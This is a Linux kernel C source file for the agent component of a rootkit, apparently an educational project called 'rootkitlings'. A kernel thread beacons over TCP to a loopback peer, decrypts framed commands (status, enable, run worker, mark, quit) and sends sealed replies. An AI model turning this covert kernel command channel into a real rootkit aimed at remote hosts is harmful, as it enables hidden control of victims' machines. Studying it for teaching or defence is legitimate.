// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/jiffies.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uio.h>
#include <net/net_namespace.h>

#include "agent.h"
#include "rootkit.h"

static ssize_t rk_socket_send(struct socket *socket,
			      const unsigned char *bytes, size_t length,
			      void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = (void *)bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_sendmsg(socket, &message, &vector, 1, length);
}

static ssize_t rk_socket_receive(struct socket *socket, unsigned char *bytes,
				 size_t length, void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_recvmsg(socket, &message, &vector, 1, length, 0);
}

static const struct rk_transport_ops rk_transport = {
	.send = rk_socket_send,
	.receive = rk_socket_receive,
};

static void rk_count_protocol_error(struct rk_agent *agent)
{
	mutex_lock(&agent->lock);
	agent->protocol_errors++;
	mutex_unlock(&agent->lock);
}

static int rk_agent_reply(struct rk_agent *agent, struct socket *socket,
			  const unsigned char *plaintext, size_t plaintext_length)
{
	unsigned char envelope[RK_FRAME_MAX];
	size_t envelope_length = 0;
	int error;

	error = rk_secure_seal_reply(&agent->secure, plaintext,
				     plaintext_length, envelope,
				     sizeof(envelope), &envelope_length);
	if (!error)
		error = rk_send_frame(&rk_transport, NULL, socket, envelope,
				      envelope_length);
	memzero_explicit(envelope, sizeof(envelope));
	return error;
}

static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
			    const unsigned char *payload, size_t payload_length,
			    bool *close_session)
{
	static const unsigned char error_reply[] = "ERR";
	static const unsigned char info_reply[] = "INFO rootkitlings";
	static const unsigned char pong_reply[] = "PONG";
	static const unsigned char enabled_reply[] = "ENABLED";
	static const unsigned char disabled_reply[] = "DISABLED";
	static const unsigned char queued_reply[] = "QUEUED";
	static const unsigned char busy_reply[] = "ERR busy";
	static const unsigned char denied_reply[] = "ERR disabled";
	unsigned char reply[RK_FRAME_MAX];
	struct rk_command command;
	size_t reply_length;
	int error;

	*close_session = false;
	error = rk_command_parse(payload, payload_length, &command);
	mutex_lock(&agent->lock);
	agent->commands++;
	if (error)
		agent->protocol_errors++;
	mutex_unlock(&agent->lock);
	if (error)
		return rk_agent_reply(agent, socket, error_reply,
			      sizeof(error_reply) - 1);

	switch (command.kind) {
	case RK_COMMAND_PING:
		return rk_agent_reply(agent, socket, pong_reply,
			      sizeof(pong_reply) - 1);
	case RK_COMMAND_INFO:
		return rk_agent_reply(agent, socket, info_reply,
			      sizeof(info_reply) - 1);
	case RK_COMMAND_STATUS:
		reply_length = scnprintf(reply, sizeof(reply), "STATUS %u %lu",
			rk_state_actions_enabled(agent->state) ? 1U : 0U,
			rk_state_worker_runs(agent->state));
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_ENABLE:
		rk_state_set_actions_enabled(agent->state, true);
		return rk_agent_reply(agent, socket, enabled_reply,
			      sizeof(enabled_reply) - 1);
	case RK_COMMAND_DISABLE:
		rk_state_set_actions_enabled(agent->state, false);
		return rk_agent_reply(agent, socket, disabled_reply,
			      sizeof(disabled_reply) - 1);
	case RK_COMMAND_RUN:
		error = rk_worker_request();
		if (!error)
			return rk_agent_reply(agent, socket, queued_reply,
				      sizeof(queued_reply) - 1);
		if (error == -EAGAIN)
			return rk_agent_reply(agent, socket, busy_reply,
				      sizeof(busy_reply) - 1);
		if (error == -EACCES)
			return rk_agent_reply(agent, socket, denied_reply,
				      sizeof(denied_reply) - 1);
		return error;
	case RK_COMMAND_MARK:
		mutex_lock(&agent->lock);
		memcpy(agent->marker, command.marker, command.marker_length + 1);
		mutex_unlock(&agent->lock);
		memcpy(reply, "MARKED ", 7);
		memcpy(reply + 7, command.marker, command.marker_length);
		reply_length = 7 + command.marker_length;
		return rk_agent_reply(agent, socket, reply, reply_length);
	case RK_COMMAND_QUIT:
		*close_session = true;
		return 0;
	case RK_COMMAND_INVALID:
	default:
		return -EPROTO;
	}
}

static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
{
	long waited;

	waited = wait_event_interruptible(
		agent->retry_wait,
		kthread_should_stop() || READ_ONCE(agent->commands_ready));
	if (kthread_should_stop())
		return 0;
	if (waited)
		return (int)waited;

	for (;;) {
		struct rk_frame frame;
		unsigned char plaintext[RK_SECURE_PLAINTEXT_MAX];
		size_t plaintext_length = 0;
		bool close_session;
		int error;

		if (kthread_should_stop())
			return 0;
		error = rk_receive_frame(&rk_transport, NULL, socket, &frame);
		if (error) {
			if (error == -EMSGSIZE)
				rk_count_protocol_error(agent);
			return error;
		}
		error = rk_secure_open_request(&agent->secure, frame.payload,
					       frame.length, plaintext,
					       sizeof(plaintext),
					       &plaintext_length);
		if (error) {
			rk_count_protocol_error(agent);
			memzero_explicit(plaintext, sizeof(plaintext));
			return error;
		}
		error = rk_agent_command(agent, socket, plaintext,
					 plaintext_length, &close_session);
		memzero_explicit(plaintext, sizeof(plaintext));
		if (error || close_session)
			return error;
	}
}

static int rk_agent_attempt(struct rk_agent *agent)
{
	struct socket *socket = NULL;
	bool connected = false;
	bool shutdown_here = false;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return error;
	if (!socket)
		return -EPROTO;

	mutex_lock(&agent->lock);
	if (agent->stopping) {
		mutex_unlock(&agent->lock);
		sock_release(socket);
		return 0;
	}
	agent->active = socket;
	agent->shutdown_started = false;
	mutex_unlock(&agent->lock);

	error = kernel_connect(socket,
			       (struct sockaddr_unsized *)&agent->peer,
			       sizeof(agent->peer), 0);
	if (error)
		goto close;
	connected = true;
	mutex_lock(&agent->lock);
	agent->connected = true;
	agent->connections++;
	agent->retry_delay_ms = agent->retry_base_ms;
	mutex_unlock(&agent->lock);
	error = rk_agent_serve(agent, socket);

close:
	mutex_lock(&agent->lock);
	if (agent->active == socket)
		agent->active = NULL;
	agent->connected = false;
	if (connected && !agent->shutdown_started) {
		agent->shutdown_started = true;
		shutdown_here = true;
	}
	mutex_unlock(&agent->lock);
	if (shutdown_here)
		(void)kernel_sock_shutdown(socket, SHUT_RDWR);
	sock_release(socket);
	return error;
}

static int rk_agent_worker(void *argument)
{
	struct rk_agent *agent = argument;

	while (!kthread_should_stop()) {
		unsigned int delay;
		long waited;
		int error;

		mutex_lock(&agent->lock);
		agent->attempts++;
		mutex_unlock(&agent->lock);
		error = rk_agent_attempt(agent);
		if (kthread_should_stop())
			break;
		mutex_lock(&agent->lock);
		if (error)
			agent->transport_errors++;
		delay = agent->retry_delay_ms;
		agent->retries++;
		if (error)
			agent->retry_delay_ms = rk_retry_next(
				agent->retry_delay_ms, agent->retry_base_ms,
				agent->retry_max_ms);
		else
			agent->retry_delay_ms = agent->retry_base_ms;
		mutex_unlock(&agent->lock);
		waited = wait_event_interruptible_timeout(
			agent->retry_wait, kthread_should_stop(),
			msecs_to_jiffies(delay));
		(void)waited;
	}
	return 0;
}

int rk_agent_start(struct rk_agent *agent, u16 peer_port,
		   unsigned int retry_base_ms, unsigned int retry_max_ms,
		   const u8 *key, size_t key_length, u64 session,
		   struct rk_state *state)
{
	struct task_struct *task;
	int error;

	if (!agent || !state || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
		return -EINVAL;
	memset(agent, 0, sizeof(*agent));
	mutex_init(&agent->lock);
	init_waitqueue_head(&agent->retry_wait);
	agent->peer.sin_family = AF_INET;
	agent->peer.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	agent->peer.sin_port = htons(peer_port);
	agent->retry_base_ms = retry_base_ms;
	agent->retry_max_ms = retry_max_ms;
	agent->retry_delay_ms = retry_base_ms;
	agent->state = state;
	agent->initialized = true;
	error = rk_secure_channel_start(&agent->secure, key, key_length, session);
	if (error) {
		agent->state = NULL;
		agent->initialized = false;
		return error;
	}
	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
	if (IS_ERR(task)) {
		rk_secure_channel_stop(&agent->secure);
		agent->state = NULL;
		agent->initialized = false;
		return PTR_ERR(task);
	}
	mutex_lock(&agent->lock);
	agent->task = task;
	mutex_unlock(&agent->lock);
	wake_up_process(task);
	return 0;
}

void rk_agent_enable_commands(struct rk_agent *agent)
{
	if (!agent || !READ_ONCE(agent->initialized))
		return;

	WRITE_ONCE(agent->commands_ready, true);
	wake_up_interruptible(&agent->retry_wait);
}

void rk_agent_stop(struct rk_agent *agent)
{
	struct task_struct *task;

	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	task = agent->task;
	if (!task) {
		agent->commands_ready = false;
		agent->state = NULL;
		agent->initialized = false;
		mutex_unlock(&agent->lock);
		rk_secure_channel_stop(&agent->secure);
		return;
	}
	agent->stopping = true;
	if (agent->active && !agent->shutdown_started) {
		agent->shutdown_started = true;
		(void)kernel_sock_shutdown(agent->active, SHUT_RDWR);
	}
	mutex_unlock(&agent->lock);
	wake_up_interruptible(&agent->retry_wait);
	(void)kthread_stop(task);
	mutex_lock(&agent->lock);
	agent->task = NULL;
	agent->connected = false;
	agent->commands_ready = false;
	agent->state = NULL;
	agent->initialized = false;
	mutex_unlock(&agent->lock);
	rk_secure_channel_stop(&agent->secure);
}

void rk_agent_snapshot(struct rk_agent *agent, struct rk_agent_status *status)
{
	if (!status)
		return;
	memset(status, 0, sizeof(*status));
	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	status->running = agent->task != NULL;
	status->connected = agent->connected;
	status->stopping = agent->stopping;
	status->peer_port = ntohs(agent->peer.sin_port);
	status->retry_base_ms = agent->retry_base_ms;
	status->retry_max_ms = agent->retry_max_ms;
	status->retry_delay_ms = agent->retry_delay_ms;
	status->attempts = agent->attempts;
	status->connections = agent->connections;
	status->commands = agent->commands;
	status->retries = agent->retries;
	status->transport_errors = agent->transport_errors;
	status->protocol_errors = agent->protocol_errors;
	memcpy(status->marker, agent->marker, sizeof(status->marker));
	mutex_unlock(&agent->lock);
}
